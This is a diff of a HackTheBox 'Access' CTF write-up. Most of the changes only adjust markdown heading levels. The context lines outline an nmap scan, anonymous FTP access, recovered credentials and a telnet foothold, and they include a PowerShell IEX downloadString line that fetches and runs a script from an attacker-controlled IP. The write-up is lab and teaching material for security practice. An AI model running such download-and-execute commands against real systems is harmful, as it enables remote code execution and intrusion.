@@ -13,15 +13,15 @@ img_path: /assets/img/hackthebox/machines/access
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Access](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).
 
 ![](0.png)
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -52,7 +52,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 We ftp with anonymous login enabled, telnet on port 23 and MS IIS http web server.
 
-## Web
+### Web
 
 Let'a check the web page.
 
@@ -60,7 +60,7 @@ Let'a check the web page.
 
 Nothing really interesting, I done a directory scan and nothing came up.
 
-## FTP
+### FTP
 
 Let's login to the ftp server as anonymous
 
@@ -76,7 +76,7 @@ Checking the different tables we find the `auth_user` table with some passwords.
 
 ![](4.png)
 
-## Zip file
+### Zip file
 
 Let's unzip the zip file.
 
@@ -92,7 +92,7 @@ We can use an online [pst-viewer](https://goldfynch.com/pst-viewer/index.html) t
 
 ![](6.png)
 
-# **Foothold**
+## **Foothold**
 
 We got credentials we user `security`, now let's use telnet to connect to the target.
 
@@ -106,7 +106,7 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.17.90/she
 
 ![](9.png)
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 Checking public desktop we find the following.
 
